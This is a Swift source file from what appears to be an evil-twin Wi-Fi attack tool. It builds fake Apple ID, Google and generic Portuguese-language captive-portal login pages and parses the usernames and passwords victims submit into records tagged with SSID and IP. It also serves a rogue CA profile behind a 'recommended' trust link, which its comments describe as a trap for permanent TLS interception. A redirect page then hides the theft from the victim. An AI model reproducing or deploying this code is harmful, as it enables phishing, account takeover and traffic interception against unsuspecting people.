import Foundation

/// A credential captured from the fake-login portal, together with the
/// context that identifies who typed it and when.
public struct CapturedCredential: Codable, Equatable, Sendable, Identifiable {
    public let id = UUID()
    /// What the victim typed in the user field.
    public let user: String
    /// What the victim typed in the password field.
    public let pass: String
    /// The Wi-Fi SSID the portal was served on (empty if unknown).
    public let ssid: String
    /// Source IP of the client that submitted the form.
    public let sourceIP: String
    /// Which flavour of the page it was (iCloud / Google / generic).
    public let page: String
    /// When the form arrived.
    public let timestamp: Date

    public init(user: String, pass: String, ssid: String,
                sourceIP: String, page: String, timestamp: Date) {
        self.user = user
        self.pass = pass
        self.ssid = ssid
        self.sourceIP = sourceIP
        self.page = page
        self.timestamp = timestamp
    }

    /// One-line summary for the UI and clipboard: `usuario — senha · rede · hora`.
    public var summary: String {
        "\(user) — \(pass)  (\(ssid.isEmpty ? "Wi-Fi" : ssid), \(sourceIP), \(timestamp.formatted(date: .omitted, time: .shortened)))"
    }
}

/// The "login" face of the Lobo captive portal. Instead of a plain
/// message page, we serve a believable sign-in form; whatever the victim
/// types is POSTed to `/__pastoral__/cred` and captured. The page can
/// also offer the Pastoral CA as a downloadable profile (`ca.mobileconfig`)
/// — one tap installs full TLS trust on iOS/macOS, turning the portal
/// target into a permanent MITM subject.
///
/// Pure and side-effect free — unit tested in isolation. The transparent
/// proxy is the only caller that turns these into actual bytes.
public enum CredentialPortal {

    /// Path the fake form POSTs to (absolute, so the browser keeps the
    /// request on the same origin — which is us, traffic being diverted).
    public static let credPath = "/__pastoral__/cred"

    /// Path serving the CA profile for the "install profile" trap.
    public static let caProfilePath = "/__pastoral__/ca.mobileconfig"

    /// Flavour of the login page. Only changes copy/branding — all of
    /// them POST to the same endpoint.
    public enum PageStyle: String, CaseIterable, Sendable {
        case icloud = "iCloud"
        case google = "Google"
        case generic = "Rede Wi-Fi"
    }

    /// The full-screen fake login page. Self-contained (inline CSS, no
    /// external assets) so it survives even while the target is starved.
    /// When `showCALink` is true a discreet "Confiar neste perfil de rede"
    /// link points at the CA profile — the classic evil-twin trust trap.
    public static func loginHTML(style: PageStyle,
                                 title: String? = nil,
                                 showCALink: Bool = false) -> String {
        let brand: String
        let subtitle: String
        let userLabel: String
        let userPlaceholder: String
        let passLabel: String
        let header: String
        let footerHint: String

        switch style {
        case .icloud:
            brand = "Apple"
            subtitle = "ID Apple"
            userLabel = "ID Apple"
            userPlaceholder = "nome, número de telefone ou e-mail"
            passLabel = "Senha"
            header = "Entrar com seu ID Apple"
            footerHint = "Este dispositivo precisa estar conectado à sua conta para usar esta rede."
        case .google:
            brand = "Google"
            subtitle = "Conta Google"
            userLabel = "E-mail ou telefone"
            userPlaceholder = "seu@gmail.com"
            passLabel = "Senha"
            header = "Fazer login no Google"
            footerHint = "Você precisa fazer login para acessar esta rede Wi-Fi."
        case .generic:
            brand = "Rede"
            subtitle = "Portal da rede"
            userLabel = "Usuário"
            userPlaceholder = "usuario"
            passLabel = "Senha"
            header = title ?? "Conectar-se à rede"
            footerHint = "Insira suas credenciais para acessar a internet."
        }

        let titleEsc = escape(title ?? header)
        let caLinkBlock: String
        if showCALink {
            caLinkBlock = """
                <a class="calink" href="\(caProfilePath)"
                   onclick="window.open(this.href,'_blank');return false;">
                Confiar neste perfil de rede (recomendado)</a>

            """
        } else {
            caLinkBlock = ""
        }

        return """
        <!doctype html>
        <html lang="pt-BR">
        <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
        <title>\(titleEsc)</title>
        <style>
          * { margin: 0; padding: 0; box-sizing: border-box; }
          html, body { height: 100%; }
          body {
            background: #f5f5f7; color: #1d1d1f;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; align-items: center; justify-content: center;
            overflow: hidden; touch-action: manipulation;
          }
          .card {
            background: #fff; width: 92vw; max-width: 360px;
            border-radius: 14px; padding: 36px 28px 28px;
            box-shadow: 0 12px 40px rgba(0,0,0,.12);
            text-align: center;
          }
        </style>
        </head>
        <body>
        <div class="card">
          <svg height="34" viewBox="0 0 170 34" width="85"><path
             d="M36.5 19.5c0-4.2 3.4-6.3 3.6-6.4-2-2.9-5-3.3-6.1-3.3-2.6-.3-5.1 1.5-6.4 1.5s-3.3-1.5-5.4-1.4c-2.8.05-5.3 1.6-6.8 4.1-3 5-.8 12.3 2.1 16.3 1.5 1.9 3.2 4.1 5.4 4 2.2-.1 3-1.4 5.6-1.4s3.4 1.4 5.7 1.4c2.3 0 3.8-2 5.2-4 1.7-2.3 2.3-4.5 2.4-4.6-.1 0-4.7-1.7-4.8-7.2zM32.3 6.8c1.2-1.4 1.9-3.5 1.7-5.5-1.7.1-3.8 1.2-5 2.6-1.1 1.3-2.1 3.3-1.8 5.3 2 .2 3.9-1 5.1-2.4z"
             fill="#1d1d1f"/></svg>
          <h1 style="font-size:20px;font-weight:600;margin-top:18px;">\(header)</h1>
          <p style="font-size:13px;color:#86868b;margin-top:6px;">\(footerHint)</p>
          <form action="\(credPath)" method="post" accept-charset="UTF-8"
                autocomplete="on" novalidate style="margin-top:22px;text-align:left;">
            <input type="hidden" name="page" value="\(style.rawValue)">
            <label style="display:block;font-size:12px;color:#515154;">\(userLabel)</label>
            <input type="text" name="user" placeholder="\(userPlaceholder)"
                   autocomplete="username" required
                   style="width:100%;padding:10px 12px;margin:6px 0 14px;border:1px solid #d2d2d7;border-radius:8px;font-size:15px;background:#fff;">
            <label style="display:block;font-size:12px;color:#515154;">\(passLabel)</label>
            <input type="password" name="pass" placeholder="••••••••"
                   autocomplete="current-password" required
                   style="width:100%;padding:10px 12px;margin:6px 0 4px;border:1px solid #d2d2d7;border-radius:8px;font-size:15px;background:#fff;">
            \(caLinkBlock)<button type="submit"
               style="width:100%;margin-top:16px;padding:11px 0;border:0;border-radius:8px;background:#0071e3;color:#fff;font-size:15px;font-weight:600;cursor:pointer;">
            Entrar</button>
          </form>
          <p style="font-size:11px;color:#a1a1a6;margin-top:14px;">\(subtitle) · uso autorizado pela rede</p>
        </div>
        </body>
        </html>
        """
    }

    /// The "you're in" page served right after the form POST lands: the
    /// victim sees a brief success screen, then the browser re-targets
    /// the last site they were on — the interruption stays under five
    /// seconds and feels like a normal captive portal.
    public static func successHTML(message: String = "Conectando…") -> String {
        let safe = escape(message)
        return """
        <!doctype html>
        <html lang="pt-BR">
        <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Rede</title>
        <style>
          body { margin: 0; height: 100vh; display: flex; align-items: center;
                 justify-content: center; background: #f5f5f7;
                 font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                 color: #1d1d1f; }
          .box { text-align: center; }
          .spin { width: 30px; height: 30px; margin: 0 auto 16px; border-radius: 50%;
                  border: 3px solid #d2d2d7; border-top-color: #0071e3;
                  animation: r 0.9s linear infinite; }
          @keyframes r { to { transform: rotate(360deg); } }
        </style>
        </head>
        <body>
          <div class="box">
            <div class="spin"></div>
            <h1 style="font-size:19px;font-weight:600;">\(safe)</h1>
            <p style="font-size:13px;color:#86868b;margin-top:8px;">A conexão será restabelecida em instantes.</p>
          </div>
          <script>setTimeout(function(){ window.location.href = 'https://www.google.com/'; }, 4000);</script>
        </body>
        </html>
        """
    }

    /// Parse the urlencoded body of the form POST (`user=...&pass=...`).
    /// Returns nil when neither user nor pass is present. `page` comes
    /// from a hidden field (which flavour of the form it was).
    /// Percent-decoding handles both `%XX` escapes and `+` as space.
    public static func parseFormBody(_ body: Data) -> (user: String, pass: String, page: String)? {
        guard var s = String(data: body, encoding: .utf8) else { return nil }
        var fields: [String: String] = [:]
        for pair in s.split(separator: "&") where !pair.isEmpty {
            let parts = pair.split(separator: "=", maxSplits: 1).map(String.init)
            guard !parts.isEmpty else { continue }
            fields[percentDecode(parts[0])] = parts.count > 1 ? percentDecode(parts[1]) : ""
        }
        guard fields["user"] != nil || fields["pass"] != nil else { return nil }
        return (fields["user"] ?? "", fields["pass"] ?? "", fields["page"] ?? "")
    }

    /// RFC-3986-ish percent decode with `+` → space (form encoding).
    static func percentDecode(_ s: String) -> String {
        var out: [UInt8] = []
        var i = s.startIndex
        while i < s.endIndex {
            let c = s[i]
            if c == "+" {
                out.append(0x20)
                i = s.index(after: i)
                continue
            }
            if c == "%" {
                let n1 = s.index(after: i)
                if n1 < s.endIndex {
                    let n2 = s.index(after: n1)
                    if n2 < s.endIndex,
                       let hi = Int(String(s[n1]), radix: 16),
                       let lo = Int(String(s[n2]), radix: 16) {
                        out.append(UInt8(hi << 4 | lo))
                        i = s.index(after: n2)
                        continue
                    }
                }
            }
            if let u = c.asciiValue {
                out.append(u)
                i = s.index(after: i)
            } else {
                // Non-ASCII char in a form value: re-encode it losslessly.
                let bytes = Array(String(c).utf8)
                out.append(contentsOf: bytes)
                i = s.index(after: i)
            }
        }
        return String(decoding: out, as: UTF8.self)
    }

    /// Escape the five HTML metacharacters — reused by PortalPage's
    /// escape(), kept local so this file stands alone for tests.
    public static func escape(_ s: String) -> String {
        var out = s
        out = out.replacingOccurrences(of: "&", with: "&amp;")
        out = out.replacingOccurrences(of: "<", with: "&lt;")
        out = out.replacingOccurrences(of: ">", with: "&gt;")
        out = out.replacingOccurrences(of: "\"", with: "&quot;")
        out = out.replacingOccurrences(of: "'", with: "&#39;")
        return out
    }
}
